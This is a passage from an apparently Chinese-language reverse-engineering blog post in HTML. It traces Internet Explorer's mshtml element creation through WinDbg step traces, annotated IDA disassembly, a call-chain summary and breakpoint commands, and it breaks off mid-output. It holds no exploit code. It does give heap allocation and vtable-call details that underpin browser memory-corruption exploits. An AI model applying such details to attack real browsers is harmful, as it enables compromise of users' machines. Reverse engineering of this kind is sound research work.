class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=0472d56c ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd6fa esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x1d:</span><br><span class="line">686cd6fa 0fb64701        movzx   eax,byte ptr [edi+1]       ds:0023:060fcf01=74</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000074 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd6fe esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x21:</span><br><span class="line">686cd6fe c1e004          shl     eax,4</span><br><span class="line">0:005&gt; r eax</span><br><span class="line">eax=00000074</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000740 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd701 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CreateElement+0x24:</span><br><span class="line">686cd701 0520397268      add     eax,offset mshtml!g_atagdesc (68723920)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd706 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x29:</span><br><span class="line">686cd706 0f8405691100    je      mshtml!CreateElement+0x2b (687e4011)    [br=0]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd70c esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x38:</span><br><span class="line">686cd70c 8b4008          mov     eax,dword ptr [eax+8] ds:0023:68724068=&#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd70f esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3b:</span><br><span class="line">686cd70f 8d4d10          lea     ecx,[ebp+10h]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd712 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3e:</span><br><span class="line">686cd712 51              push    ecx</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd713 esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3f:</span><br><span class="line">686cd713 52              push    edx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd714 esp=0472d520 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x40:</span><br><span class="line">686cd714 57              push    edi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd715 esp=0472d51c ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x41:</span><br><span class="line">686cd715 ffd0            call    eax &#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;</span><br><span class="line">...................................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=00000065 edx=00000004 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd729 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x4d:</span><br><span class="line">686cd729 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=00000004 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd72c esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x50:</span><br><span class="line">686cd72c 8b11            mov     edx,dword ptr [ecx]  ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd72e esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x52:</span><br><span class="line">686cd72e 8b4210          mov     eax,dword ptr [edx+10h] ds:0023:685557a8=&#123;mshtml!CElement::Init (686c9f5d)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686c9f5d ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd731 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x55:</span><br><span class="line">686cd731 ffd0            call    eax &#123;mshtml!CElement::Init (686c9f5d)&#125;</span><br><span class="line">........................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd748 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x64:</span><br><span class="line">686cd748 8b5510          mov     edx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74b esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x67:</span><br><span class="line">686cd74b 51              push    ecx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74c esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x68:</span><br><span class="line">686cd74c 57              push    edi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74d esp=0472d520 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x69:</span><br><span class="line">686cd74d 52              push    edx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74e esp=0472d51c ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x6a:</span><br><span class="line">686cd74e e85b000000      call    mshtml!CElement::InitAttrBag (686cd7ae)</span><br><span class="line">......................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=00000000 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd76e esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x82:</span><br><span class="line">686cd76e 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd771 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x85:</span><br><span class="line">686cd771 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0472d538=00000000</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd774 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x88:</span><br><span class="line">686cd774 897df4          mov     dword ptr [ebp-0Ch],edi ss:0023:0472d534=0472d548</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd777 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x8b:</span><br><span class="line">686cd777 8b11            mov     edx,dword ptr [ecx]  ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd779 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x8d:</span><br><span class="line">686cd779 8b92f8000000    mov     edx,dword ptr [edx+0F8h] ds:0023:68555890=&#123;mshtml!CElement::Init2 (686ca047)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd77f esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x93:</span><br><span class="line">686cd77f 8d45f4          lea     eax,[ebp-0Ch]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd782 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x96:</span><br><span class="line">686cd782 50              push    eax</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd783 esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x97:</span><br><span class="line">686cd783 ffd2            call    edx &#123;mshtml!CElement::Init2 (686ca047)&#125;</span><br></pre></td></tr></table></figure></p>
<p>主要功能及注释<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">686</span>CD6FA                 movzx   eax, byte ptr [edi+<span class="number">1</span>] ; eax为索引</span><br><span class="line">.text:<span class="number">686</span>CD6FE                 shl     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">686</span>CD701                 add     eax, offset CTagDesc <span class="keyword">const</span> * <span class="keyword">const</span> g_atagdesc ; 函数数组的地址</span><br><span class="line">.text:<span class="number">686</span>CD706                 jz      loc_687E4011</span><br><span class="line">.text:<span class="number">686</span>CD70C                 mov     eax, [eax+<span class="number">8</span>]    ; 得到函数的实际地址</span><br><span class="line">.text:<span class="number">686</span>CD70F                 lea     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD712                 push    ecx</span><br><span class="line">.text:<span class="number">686</span>CD713                 push    edx</span><br><span class="line">.text:<span class="number">686</span>CD714                 push    edi</span><br><span class="line">.text:<span class="number">686</span>CD715                 call    eax             ; 调用函数</span><br><span class="line">.text:<span class="number">686</span>CD717                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD719                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD71B                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD721                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD723                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD729                 mov     ecx, [ebp+arg_8] ; 得到上面call eax的结果即元素创建的返回值存到ecx</span><br><span class="line">.text:<span class="number">686</span>CD72C                 mov     edx, [ecx]</span><br><span class="line">.text:<span class="number">686</span>CD72E                 mov     eax, [edx+<span class="number">10</span>h]  ; 取得相应元素虚表偏移<span class="number">0x10</span>处的函数调用</span><br><span class="line">.text:<span class="number">686</span>CD731                 call    eax</span><br><span class="line">.text:<span class="number">686</span>CD733                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD735                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD737                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD73D                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD73F                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD745                 mov     ecx, [ebp+arg_4] ; <span class="keyword">this</span></span><br><span class="line">.text:<span class="number">686</span>CD748                 mov     edx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD74B                 push    ecx</span><br><span class="line">.text:<span class="number">686</span>CD74C                 push    edi             ; <span class="class"><span class="keyword">struct</span> <span class="title">CMarkup</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">686</span>CD74D                 push    edx             ; <span class="class"><span class="keyword">struct</span> <span class="title">CHtmTag</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">686</span>CD74E                 call    CElement::InitAttrBag(CHtmTag *,CMarkup *)</span><br><span class="line">.text:<span class="number">686</span>CD753                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD755                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD757                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD75D                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD75F                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD765                 mov     ecx, [ebp+arg_C]</span><br><span class="line">.text:<span class="number">686</span>CD768                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">686</span>CD76B                 mov     [ebp+var_4], ecx</span><br><span class="line">.text:<span class="number">686</span>CD76E                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD771                 mov     [ebp+var_8], eax</span><br><span class="line">.text:<span class="number">686</span>CD774                 mov     [ebp+var_C], edi</span><br><span class="line">.text:<span class="number">686</span>CD777                 mov     edx, [ecx]</span><br><span class="line">.text:<span class="number">686</span>CD779                 mov     edx, [edx+<span class="number">0F</span>8h] ; 取得所创建元素虚表偏移<span class="number">0xf8</span>处的虚函数并在下面调用</span><br><span class="line">.text:<span class="number">686</span>CD77F                 lea     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">686</span>CD782                 push    eax</span><br><span class="line">.text:<span class="number">686</span>CD783                 call    edx</span><br></pre></td></tr></table></figure></p>
<p>下面继续分析创建 <code>span</code> 元素的函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">68648F</span>8C ; <span class="keyword">int</span> __stdcall CSpanElement::CreateElement(struct CHtmTag *, struct CDoc *, struct CElement **)</span><br><span class="line">.text:<span class="number">68648F</span>8C <span class="keyword">public</span>: <span class="keyword">static</span> <span class="keyword">long</span> __stdcall CSpanElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *) proc near</span><br><span class="line">.text:<span class="number">68648F</span>8C                                         ; DATA XREF: .text:<span class="number">68723</span>ED8↓o</span><br><span class="line">.text:<span class="number">68648F</span>8C</span><br><span class="line">.text:<span class="number">68648F</span>8C arg_4           = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">68648F</span>8C arg_8           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">68648F</span>8C</span><br><span class="line">.text:<span class="number">68648F</span>8C                 mov     edi, edi</span><br><span class="line">.text:<span class="number">68648F</span>8E                 push    ebp</span><br><span class="line">.text:<span class="number">68648F</span>8F                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">68648F</span>91                 push    esi</span><br><span class="line">.text:<span class="number">68648F</span>92                 push    <span class="number">28</span>h             ; dwBytes</span><br><span class="line">.text:<span class="number">68648F</span>94                 push    <span class="number">8</span>               ; dwFlags</span><br><span class="line">.text:<span class="number">68648F</span>96                 push    _g_hProcessHeap ; hHeap</span><br><span class="line">.text:<span class="number">68648F</span>9C                 call    ds:HeapAlloc(x,x,x)</span><br><span class="line">.text:<span class="number">68648F</span>A2                 mov     esi, eax        ; 创建元素后保存在的内存地址</span><br><span class="line">.text:<span class="number">68648F</span>A4                 test    esi, esi</span><br><span class="line">.text:<span class="number">68648F</span>A6                 jz      <span class="keyword">short</span> loc_68648FD2 ; 分配失败直接跳转到函数尾</span><br><span class="line">.text:<span class="number">68648F</span>A8                 push    [ebp+arg_4]     ; 传过来的CDoc对象</span><br><span class="line">.text:<span class="number">68648F</span>AB                 push    <span class="number">5B</span>h</span><br><span class="line">.text:<span class="number">68648F</span>AD                 call    CElement::CElement(ELEMENT_TAG,CDoc *)</span><br><span class="line">.text:<span class="number">68648F</span>B2                 mov     dword ptr [esi], offset <span class="keyword">const</span> CSpanElement::`vftable'</span><br><span class="line">.text:<span class="number">68648F</span>B8                 mov     eax, esi        ; eax = esi = span</span><br><span class="line">.text:<span class="number">68648F</span>BA</span><br><span class="line">.text:<span class="number">68648F</span>BA loc_68648FBA:                           ; CODE XREF: CSpanElement::CreateElement(CHtmTag *,CDoc *,CElement * *)+<span class="number">48</span>↓j</span><br><span class="line">.text:<span class="number">68648F</span>BA                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">68648F</span>BD                 mov     [ecx], eax</span><br><span class="line">.text:<span class="number">68648F</span>BF                 neg     eax</span><br><span class="line">.text:<span class="number">68648F</span>C1                 sbb     eax, eax</span><br><span class="line">.text:<span class="number">68648F</span>C3                 <span class="keyword">and</span>     eax, <span class="number">7F</span>F8FFF2h</span><br><span class="line">.text:<span class="number">68648F</span>C8                 add     eax, <span class="number">8007000</span>Eh</span><br><span class="line">.text:<span class="number">68648F</span>CD                 pop     esi</span><br><span class="line">.text:<span class="number">68648F</span>CE                 pop     ebp</span><br><span class="line">.text:<span class="number">68648F</span>CF                 retn    <span class="number">0</span>Ch</span><br></pre></td></tr></table></figure></p>
<p>可以看到又调用啦 <code>CElement::CElement</code> 函数，现在我们可以做一下总结，当创建一个元素一般经历的步骤是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CDocument::createElement</span><br><span class="line">    |---&gt;CDocument::CreateElementHelper</span><br><span class="line">            |---&gt;CMarkup::CreateElement</span><br><span class="line">                    |---&gt;mshtml!CreateElement</span><br><span class="line">                         |---&gt;CXXXElement::CreateElement</span><br><span class="line">                                  |---&gt;HeapAlloc+CElement::CElement</span><br></pre></td></tr></table></figure></p>
<p>下面通过在 <code>mshtml!CreateElement + 0x41</code> 和 <code>mshtml!CElement::CElement+0x1e</code> 下断点观测元素创建的过程:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line">0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at 